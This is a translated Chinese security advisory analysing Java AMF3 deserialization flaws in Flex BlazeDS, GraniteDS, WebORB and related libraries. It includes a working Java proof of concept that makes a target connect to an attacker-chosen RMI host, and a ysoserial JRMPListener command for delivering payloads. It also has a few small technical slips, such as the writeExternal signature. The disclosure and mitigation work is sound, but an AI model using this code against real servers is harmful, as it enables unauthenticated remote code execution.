# 【技术分享】Java AMF3 反序列化漏洞分析

## 译文声明
本文为翻译文章，原文来源：安全客。具体内容表达及含义以原文为准。
- 翻译：[WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)
- 预估稿费：170RMB
- 投稿方式：发送邮件至linwei#360.cn，或登录网页版在线投稿

## 前言
AMF（Action Message Format）是一种二进制序列化格式，最初主要用于Flash应用程序。近期，Code White发现多个Java AMF库中存在漏洞，这些漏洞可能导致未经身份验证的远程代码执行。由于AMF广泛使用，多家厂商的产品可能受到影响，包括Adobe、Atlassian、HPE、SonicWall和VMware等。相关漏洞信息已上报至美国CERT，详情请参见[VU#307983](https://www.kb.cert.org/vuls/id/307983)。

## 概述
Code White主要研究了以下几种流行的Java AMF实现：
- Adobe Flex BlazeDS
- Apache Flex BlazeDS
- Exadel Flamingo AMF Serializer (已停止更新)
- GraniteDS (已停止更新)
- Midnight Coders WebORB for Java

这些实现存在一个或多个以下漏洞：
- XML外部实体注入（XXE）
- 任意对象创建及属性设置
- 通过RMI实现Java序列化

## 漏洞影响
简而言之，任何远程攻击者如果能够欺骗并控制服务器的通信连接，就可以向目标主机发送包含恶意代码的序列化Java对象。当该对象在目标主机上反序列化时，恶意代码将被执行。前两个漏洞并不是新问题，但目前仍有许多库存在这些问题。此外，研究人员还发现了一种方法，可以将这种设计缺陷转化为Java序列化漏洞。

我们将详细描述上述漏洞（除了XXE）。有关XXE漏洞的详细信息，请参考我们之前的文章《[CVE-2015-3269: Apache Flex BlazeDS XXE Vulnerability](http://codewhitesec.blogspot.en/2015/08/cve-2015-3269-apache-flex-blazeds-xxe.html)》。

## 介绍
AMF3（Action Message Format version 3）是一种二进制消息编码格式，主要用于Flash应用与后端交互。类似于JSON，它支持多种数据类型。为了向后兼容，AMF3实际上是AMF的一种扩展实现，并引入了新的对象类型。AMF3对象的新功能主要包括两种新增特性：

### Dynamic 特性
- **Dynamic**：具有动态特性的类实例允许在运行时动态添加或删除公共变量成员。
- **Externalizable**：实现flash.utils.IExternalizable接口并完全控制其成员序列化的类实例。

#### Dynamic 特性
Dynamic特性类似于JavaBeans的功能，允许通过类名和属性创建对象。许多JavaBeans实体已经实现了这种技术，例如java.beans.Introspector、Flamingo、Flex BlazeDS和WebORB等。然而，这种功能可能导致可利用的漏洞。实际上，Wouter Coekaerts早在2011年就披露了这种存在于AMF实现中的漏洞，并在2016年发布了相应的漏洞利用代码和PoC。

#### Externalizable 特性
Externalizable特性类似于Java的java.io.Externalizable接口。许多厂商已经调整了flash.utils.IExternalizable接口的规范，使其与Java的java.io.Externalizable非常相似。这种特性允许高效地重构实现了java.io.Externalizable接口的类。

java.io.Externalizable接口定义了两个方法：readExternal（java.io.ObjectInput）和writeExternal（java.io.ObjectInput），这两个方法允许Java类完全控制序列化和反序列化操作。这意味着在程序运行过程中不存在默认的序列化/反序列化行为和有效性检查。因此，相对于java.io.Serializable，使用java.io.Externalizable实现序列化/反序列化更加简单和高效。

### 将EXTERNALIZABLE.READEXTERNAL转换为OBJECTINPUTSTREAM.READOBJECT
在OpenJDK 8u121中，共有十五个类实现了java.io.Externalizable接口，其中大多数类的任务仅仅是重构对象状态。传递给Externalizable.readExternal（java.io.ObjectInput）方法的java.io.ObjectInput实例通常不是java.io.ObjectInputStream的实例。

在这十五个类中，与RMI相关的类引起了我们的注意，特别是sun.rmi.server.UnicastRef和sun.rmi.server.UnicastRef2。它们通过sun.rmi.transport.LiveRef.read(ObjectInput, boolean)方法来重构sun.rmi.transport.LiveRef对象。此外，这个方法还会重构sun.rmi.transport.tcp.TCPEndpoint对象和本地sun.rmi.transport.LiveRef对象，并在sun.rmi.transport.DGCClient中注册。DGCClient负责实现客户端的RMI分布式垃圾回收系统。关于DGCClient的更多信息，请参阅OpenJDK官方文档【[传送门](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u121-b00/src/share/classes/sun/rmi/transport/DGCClient.java#l54)】。

根据官方文档，LiveRef的注册是通过一次远程调用完成的，这可能允许我们通过RMI实现远程代码执行（RCE）。通过对这次调用进行追踪分析，我们发现整个调用过程非常复杂，涉及Externalizable.readExternal、sun.rmi.server.UnicastRef/sun.rmi.server.UnicastRef2、ObjectInputStream.readObject以及sun.rmi.transport.StreamRemoteCall.executeCall()等多种对象和方法。

接下来，让我们看看通过sun.rmi.server.UnicastRef对象对AMF消息进行反序列化会发生什么。以下是利用Flex BlazeDS的示例代码：

```java
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Arrays;
import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.ActionContext;
import flex.messaging.io.amf.ActionMessage;
import flex.messaging.io.amf.AmfMessageDeserializer;
import flex.messaging.io.amf.AmfMessageSerializer;
import flex.messaging.io.amf.MessageBody;

public class Amf3ExternalizableUnicastRef {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        if (args.length < 2) {
            System.out.println("Usage: java -cp ... Amf3ExternalizableUnicastRef <host> <port>");
            return;
        }
        boolean doDeserialize = false;
        if (args.length == 3) {
            doDeserialize = true;
            args = Arrays.copyOfRange(args, 1, args.length);
        }
        // 生成UnicastRef对象
        Object unicastRef = generateUnicastRef(args[0], Integer.parseInt(args[1]));
        // 序列化对象到AMF消息
        byte[] amf = serialize(unicastRef);
        // 反序列化AMF消息
        if (doDeserialize) {
            deserialize(amf);
        } else {
            System.out.write(amf);
        }
    }

    public static Object generateUnicastRef(String host, int port) {
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        return new sun.rmi.server.UnicastRef(liveRef);
    }

    public static byte[] serialize(Object data) throws IOException {
        MessageBody body = new MessageBody();
        body.setData(data);
        ActionMessage message = new ActionMessage();
        message.addBody(body);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        AmfMessageSerializer serializer = new AmfMessageSerializer();
        serializer.initialize(SerializationContext.getSerializationContext(), out, null);
        serializer.writeMessage(message);
        return out.toByteArray();
    }

    public static void deserialize(byte[] amf) throws ClassNotFoundException, IOException {
        ByteArrayInputStream in = new ByteArrayInputStream(amf);
        AmfMessageDeserializer deserializer = new AmfMessageDeserializer();
        deserializer.initialize(SerializationContext.getSerializationContext(), in, null);
        deserializer.readMessage(new ActionMessage(), new ActionContext());
    }
}
```

为了验证代码是否正常运行，我们首先设置了一个监听器，然后查看链接是否成功建立。此时，我们成功与客户端建立了通信连接，并使用了[Java RMI传输协议](https://docs.oracle.com/javase/8/docs/platform/rmi/spec/rmi-protocol3.html)。

## 漏洞利用
jacob Baines在2016年公开了这项技术（[反序列化黑名单绕过](https://www.tenable.com/security/research/tra-2017-07)），但他当时可能不知道这种技术同样会将任意的Externalizable.readExternal对象转换为ObjectInputStream.readObject对象。他还介绍了一个可以发送任意Payload的JRMP监听器：

```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener ...
```

## 厂商产品影响情况
| 厂商 | 状态 | 通知日期 | 更新日期 |
| --- | --- | --- | --- |
| Adobe | [受影响](https://www.kb.cert.org/vuls/id/BLUU-AKVRGP) | 2017-03-28 | 2017-04-03 |
| Apache Software Foundation | [受影响](https://www.kb.cert.org/vuls/id/BLUU-AKVRGX) | 2017-03-28 | 2017-04-06 |
| Atlassian | [受影响](https://www.kb.cert.org/vuls/id/GWAN-AKHSWU) | – | 2017-03-28 |
| Exadel | [未知](https://www.kb.cert.org/vuls/id/BLUU-AKVRGK) | 2017-03-28 | 2017-03-28 |
| Granite Data Services | [未知](https://www.kb.cert.org/vuls/id/BLUU-AKHTCH) | 2017-03-16 | 2017-03-16 |
| Hewlett Packard Enterprise | [未知](https://www.kb.cert.org/vuls/id/BLUU-AKVRGU) | 2017-03-28 | 2017-03-28 |
| Midnight Coders | [未知](https://www.kb.cert.org/vuls/id/BLUU-AKHTCK) | 2017-03-16 | 2017-04-03 |
| Pivotal | [未知](https://www.kb.cert.org/vuls/id/BLUU-AKVRGM) | 2017-03-28 | 2017-03-28 |
| SonicWall | [未知](https://www.kb.cert.org/vuls/id/BLUU-AKVRGH) | 2017-03-28 | 2017-03-28 |
| VMware | [未知](https://www.kb.cert.org/vuls/id/BLUU-AKHTCM) | 2017-03-16 | 2017-03-16 |

## 缓解方案
- 使用Adobe或Apache实现的应用程序应尽快将Apache更新至最新版本（v4.7.3）。
- Exadel已经停止对其代码库的维护，因此使用Flamingo AMF Serializer的用户不会再收到更新推送。
- 目前对于GraniteDS和WebORB还没有合适的解决方案。

## 参考资料
- CVE ID：CVE-2015-3269、CVE-2016-2340、CVE-2017-5641、CVE-2017-5983、CVE-2017-3199、CVE-2017-3200、CVE-2017-3201、CVE-2017-3202、CVE-2017-3203、CVE-2017-3206、CVE-2017-3207、CVE-2017-3208
- 公开日期：2017年4月4日
- 最新更新日期：2017年4月4日
- 文档版本：73